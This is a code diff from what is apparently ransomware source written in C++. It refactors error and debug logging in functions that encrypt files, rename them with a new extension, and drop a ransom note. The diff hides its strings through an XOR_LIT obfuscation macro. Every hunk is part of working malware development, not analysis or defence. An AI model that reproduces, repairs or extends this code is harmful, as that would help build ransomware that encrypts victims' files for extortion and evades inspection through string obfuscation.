@@ -6,11 +6,12 @@ namespace Encryption {
     bool EncryptFileOut(const std::string filePathIn, const std::string filePathOut) {
 
         std::ifstream in{ filePathIn, std::ios::binary };
-        if (!in.good()) {
+        if (!in.good()) {            
+            std::string errorMessage = std::string(XOR_LIT("Could not open file"));
             XorLogger::LogError(std::vformat(
                 "{} {}",
                 std::make_format_args(
-                    const std::string(XOR_LIT("Could not open file")),
+                    errorMessage,
                     filePathIn
                 )
             ));
@@ -22,10 +23,11 @@ namespace Encryption {
 
         std::ofstream out{ filePathIn, std::ios_base::out | std::ios::binary };
         if (!out.good()) {
+            std::string errorMessage = std::string(XOR_LIT("Could not open file"));
             XorLogger::LogError(std::vformat(
                 "{} {}",
                 std::make_format_args(
-                    const std::string(XOR_LIT("Could not open file")),
+                    errorMessage,
                     filePathIn
                 )
             ));
@@ -36,10 +38,11 @@ namespace Encryption {
 
         if (!MoveFile(filePathIn.c_str(), filePathOut.c_str())) {
             DWORD errorCode = GetLastError();
+            std::string errorMessage = std::string(XOR_LIT("Failed to append extension to"));
             XorLogger::LogError(std::vformat(
                 "{} {}. Error code: {}",
                 std::make_format_args(
-                    const std::string(XOR_LIT("Failed to append extension to")),
+                    errorMessage,
                     filePathIn,
                     errorCode
                 )
@@ -47,10 +50,11 @@ namespace Encryption {
             return false;
         }
 
+        std::string debugMessage = std::string(XOR_LIT("Encrypted and appended extension to"));
         XorLogger::LogDebug(std::vformat(
             "{} {}",
             std::make_format_args(
-                const std::string(XOR_LIT("Encrypted and appended extension to")),
+                debugMessage,
                 filePathIn
             )
         ));
@@ -78,10 +82,11 @@ namespace Encryption {
             }
         }
         catch (...) {
+            std::string errorMessage = std::string(XOR_LIT("Unknown exception when processing file"));
             XorLogger::LogError(std::vformat(
                 "{} {}",
                 std::make_format_args(
-                    const std::string(XOR_LIT("Unknown exception when processing file")),
+                    errorMessage,
                     file_path
                 )
             ));
@@ -104,10 +109,11 @@ namespace Encryption {
                 if (!out) {
                     DWORD error = ::GetLastError(); // call close as possible to cause of error
                     std::string message = std::system_category().message(error);
+                    std::string notefilename = std::string(NOTE_FILENAME);
                     XorLogger::LogError(std::vformat(
                         XOR_LIT("Error dropping ransom note ({}): {}"),
                         std::make_format_args(
-                            const std::string(NOTE_FILENAME),
+                            notefilename,
                             message
                         )
                     ));
